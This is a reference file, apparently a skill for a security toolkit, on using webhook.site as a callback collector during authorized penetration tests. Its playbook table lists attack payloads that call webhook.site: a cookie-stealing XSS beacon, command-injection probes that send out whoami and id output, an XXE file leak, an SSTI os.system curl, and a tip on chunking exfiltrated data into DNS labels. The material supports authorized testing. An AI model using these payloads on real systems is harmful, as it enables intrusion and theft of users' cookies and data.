---
name: webhook-site
description: "Auth/lab ref: webhook.site: hosted out-of-band application security testing (OAST) collector - instantly generates a unique HTTPS URL plus DNSHook subdomain that records every HTTP request and DNS query, with a Web UI."
license: "Web UI free tier; whcli MIT; commercial paid plans"
compatibility: "Web UI in any browser; HTTP/JSON API with `Api-Key` header for programmatic access."
metadata:
  author: AeonDave
  version: "1.0"
---

# webhook.site

Hosted OAST collector + request inspector. Visiting [webhook.site](https://webhook.site) mints a unique token of the form `https://webhook.site/<uuid>`; every HTTP request and DNS query (via the matching `*.dnshook.site` subdomain) to that token is recorded with full headers, body, source IP, geolocation, and timing, and surfaced in a Web UI, JSON API, and (with `whcli`) a CLI stream that can forward or execute on each event.

Use it as the public callback endpoint for any blind vulnerability class, OAuth/SAML round-trip inspection, webhook integration debugging, or a temporary HTTPS relay into a local service during authorized engagements.

## Scope Guard

- Confirm authorization in writing before pointing any target application, OAuth flow, or callback at webhook.site. Captured requests can contain tokens, cookies, PII, and credentials.
- Treat the token URL like a secret — anyone who knows it can read every request. Use the "Protect with password" / "Login required" features on paid plans for sensitive captures.
- For long-running or multi-operator engagements, use a paid token (persistent, higher limits) or self-host the open-source `webhook.site` server on owned infrastructure.
- Free anonymous tokens expire after 7 days of inactivity and cap at 100 requests / 10 MB body — fine for OAST PoCs, not for sustained collection.
- Webhook.site is third-party SaaS: the operator (Simon Fredsted / webhook.site GmbH) sees every payload. Do not route customer production traffic, regulated data, or live credentials through it without a contractual agreement.
- For DNS exfil that must not transit a third party, prefer self-hosted `interactsh` or an authoritative server you control.

## When to Pick webhook.site

| Need | Pick |
|---|---|
| HTTPS endpoint + DNS subdomain, full request UI, < 30 s setup | **webhook.site** |
| Multi-protocol OAST (HTTP, DNS, SMTP, LDAP), self-hosted | `interactsh` (oast.pro / self-host) |
| XSS-only blind callback with screenshot + DOM | XSS Hunter (xsshunter.com / self-host) |
| Raw TCP listener for custom protocols | `bore`, `ncat -lkvnp`, custom Python |
| HTTPS tunnel to a real local web app with debugger | `pinggy`, `ngrok`, `cloudflared` |
| Persistent C2 channel | Dedicated C2 framework — webhook.site is not stealthy and not designed for it |

## Concepts

- **Token**: a UUID that owns a callback URL `https://webhook.site/<uuid>`. Created automatically when you open the homepage in a browser, or programmatically via `POST /token`.
- **DNSHook**: every token has a matching `<id>.dnshook.site` subdomain (`<id>` derived from the UUID). Any DNS query to `<sub>.<id>.dnshook.site` is captured.
- **Email**: every token also has `<id>@email.webhook.site` for inbound email capture.
- **Custom Actions** (paid): per-token rules that modify the response, forward the request elsewhere, transform the body, or conditionally branch. Effectively a tiny serverless dataflow over the captured traffic.
- **API key**: a per-account secret sent as the `Api-Key` HTTP header. Lets `whcli` and scripts create tokens, list/read requests, manage custom actions, and forward without anonymous rate limits.
- **Whitelist IPs**: outbound traffic from webhook.site (and Custom Action forwards) originates from `178.63.67.106`, `178.63.67.153`, `2a01:4f8:121:114d::/64`, `2a01:4f8:121:11a5::/64`. Open these on your target firewall when forwarding from webhook.site into an internal collector.

## Quick Starts (Web UI)

1. Open `https://webhook.site` → page is now bound to a new token URL shown at the top.
2. Trigger the callback (paste the URL into the target form, payload, OAuth `redirect_uri`, SSRF probe, etc.).
3. Inspect each captured request in the left pane: method, headers, raw + parsed body, source IP, country, user agent, timing.
4. Use **Edit** to change the default 200 response (status code, headers, body, content-type, delay) when the target expects something specific.
5. Use **Copy** for the unique URL, `<id>.dnshook.site` host, or `<id>@email.webhook.site` address.
6. Optional: "Login required" on the token page to gate UI access (paid).

## Quick Starts (CLI — `whcli`)

```bash
# Install via Node (preferred for `forward`/`exec`)
npm install -g whcli

# Or via Docker
docker run --rm -it ghcr.io/webhooksite/whcli:latest --help

# Stream a token to the terminal
whcli forward --token=<UUID>

# Forward every captured request to a local web service
whcli forward --token=<UUID> --target=http://127.0.0.1:8080

# Forward only requests whose query string matches ?op=cb
whcli forward --token=<UUID> --target=http://127.0.0.1:8080 --query='op=cb'

# Run a local command per request (the raw request body is piped to stdin)
whcli exec --token=<UUID> --command='/usr/local/bin/handle.sh'

# Auth (paid plans / private tokens)
export WH_API_KEY='...'
whcli forward --token=<UUID> --target=http://127.0.0.1:8080
```

`whcli` keeps an HTTP long-poll / websocket open against `https://webhook.site` and replays every captured event locally — turning a public token into a real local listener without exposing your machine.

## Quick Starts (JSON API)

Base URL: `https://webhook.site`. Authenticate scripted access with `Api-Key: <YOUR_KEY>`.

```bash
# Create a new token (returns JSON with uuid, alias, default-content, etc.)
curl -s -H 'Api-Key: '"$WH_API_KEY" -H 'Content-Type: application/json' \
  -d '{"default_status":200,"default_content":"ok","default_content_type":"text/plain"}' \
  https://webhook.site/token | jq .uuid

# List captured requests (paginated, newest first)
curl -s -H 'Api-Key: '"$WH_API_KEY" \
  "https://webhook.site/token/<UUID>/requests?sorting=newest&per_page=50" | jq '.data[] | {ip,method,url,query}'

# Read one request's raw body
curl -s -H 'Api-Key: '"$WH_API_KEY" \
  "https://webhook.site/token/<UUID>/request/<REQ_UUID>/raw"

# Delete all requests for a token
curl -s -X DELETE -H 'Api-Key: '"$WH_API_KEY" \
  "https://webhook.site/token/<UUID>/request"
```

Body size limit: 10 MB per request (free); contact provider for paid tier limits.

## OAST Playbook

The point of webhook.site is to confirm "did the target side-effect actually fire". Pick the channel that the vulnerability class can reach.

| Vulnerability | Channel | Payload pattern |
|---|---|---|
| Blind SSRF | HTTP | `http://<UUID>.webhook.site/ssrf-probe?id=<MARKER>` or `https://webhook.site/<UUID>?via=ssrf` |
| Blind XXE (HTTP egress) | HTTP via external DTD | DTD on attacker server referencing `http://webhook.site/<UUID>/?leak=&file;` |
| Blind XXE (DNS only) | DNSHook | DTD that triggers DNS resolution of `<MARKER>.<id>.dnshook.site` |
| Blind RCE / cmd injection | HTTP + DNS | `curl https://webhook.site/<UUID>/$(whoami)` (HTTP) or `nslookup $(id -u).<id>.dnshook.site` (DNS — works through restrictive egress) |
| Blind XSS | HTTP `fetch` beacon | `<script>fetch('https://webhook.site/<UUID>/x?u='+document.cookie)</script>` (use XSS Hunter for richer DOM capture) |
| OAuth / SAML redirect handling | HTTP | Set `redirect_uri` / `RelayState` / `ACS URL` to the token URL, inspect query/body for tokens. |
| SMTP / mail callback | Email alias | Trigger app to send mail to `<id>@email.webhook.site`. |
| Template / SSTI sanity check | HTTP | `{{ ''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['__builtins__']['__import__']('os').system('curl -s https://webhook.site/<UUID>?ok') }}` (lab-style payload only). |
| Webhook integration debugging | HTTP | Point the third-party app's outbound webhook at the token URL and inspect headers/signature. |

Tips:

- Encode a unique marker per probe (`?id=<host>-<param>-<timestamp>`) so multi-target campaigns can attribute callbacks.
- DNS exfil: chunk data with base32 (DNS-safe) into labels, max 63 chars each, max 253 total: `<chunk>.<chunk>.<id>.dnshook.site`.
- Use Custom Actions to auto-forward only callbacks matching a query/header pattern to your internal collector, ignoring scanner noise.

## Custom Actions (Paid)

Per-token rules evaluated on every inbound request. Useful primitives:

- **Set response** — return a specific status / headers / body to coerce the target into a follow-up request (e.g. 302 redirect chain for OAuth abuse, JSON shape for webhook contract tests).
- **Forward** — relay the request to an internal URL (honor the webhook.site outbound IP whitelist). Effectively turns the token into a public-facing reverse proxy.
- **Modify** — rewrite body / headers / URL via templating before forwarding.
- **Conditional** — branch on request properties (method, header, query, JSON path) so the same token serves multiple workflows.
- **Stop** — short-circuit further action evaluation.

Combine actions to build small dataflow pipelines (e.g. "if `X-Phish-Token` header present, forward to internal collector; else return 200"). For complex transforms prefer `whcli forward --target` to a local service you fully control.

## Hardening Checklist

- Use a per-engagement token; rotate after the engagement to invalidate any payloads that escaped scope.
- Set a non-trivial `default_content` and content-type — some targets behave differently when the callback returns HTML vs JSON vs empty.
- On paid plans, enable "Login required" or password-protect the token before sending the URL to anyone outside the operator team.
- When forwarding to internal services (Custom Actions or `whcli forward`), require an `Api-Key`-style shared header so only webhook.site traffic is honored.
- Open OS firewall rules only for the webhook.site source IPs (`178.63.67.106`, `178.63.67.153`, `2a01:4f8:121:114d::/64`, `2a01:4f8:121:11a5::/64`) on the internal collector side.
- For high-stakes captures (production credentials, regulated data), self-host the open-source `webhook.site` server or use `interactsh` on owned infrastructure.
- Treat captured bodies as evidence: export via API into the engagement ticket, then purge the token (`DELETE /token/<UUID>/request`).

## Troubleshooting

| Symptom | Likely cause | Fix |
|---|---|---|
| Callback never appears in UI | Token URL typo, target egress blocked, payload mis-encoded. | Curl the URL from your own box; check `*.dnshook.site` for DNS-only egress. |
| Request body truncated / empty | 10 MB cap exceeded, or chunked encoding the proxy stripped. | Drop large fields, or use `whcli forward` to a local sink without the cap. |
| Token returns 429 / "rate limit" | Free anonymous token hit the 100-request cap. | Upgrade to a paid token, or rotate tokens per probe. |
| `whcli forward` reconnects every few seconds | Listen timeout or websocket drop; expected behavior. | Set `WH_LISTEN_TIMEOUT` higher; the CLI auto-resumes. |
| Custom Action forward never reaches internal host | Firewall blocks webhook.site outbound IPs. | Allow the published IPv4/IPv6 ranges, or move to `whcli forward` originating from your own host. |
| DNSHook captures nothing | Target resolver caches NXDOMAIN, or only egress is HTTP. | Use a unique sub-label per probe to bust caches; for HTTP-only egress switch the probe to a `https://webhook.site/<UUID>/...` URL. |
| Captured headers missing original client IP | A reverse proxy in front of the target rewrote `X-Forwarded-For`. | Look at `client_ip` field in the API; cross-reference with target access logs. |

## Resources

| File | When to load |
|---|---|
| `references/usage-matrix.md` | Full `whcli` flag matrix, JSON API endpoint reference, OAST payload bank per vulnerability class, Custom Action recipes, side-by-side comparison vs interactsh / XSS Hunter / RequestBin / bore / pinggy. |
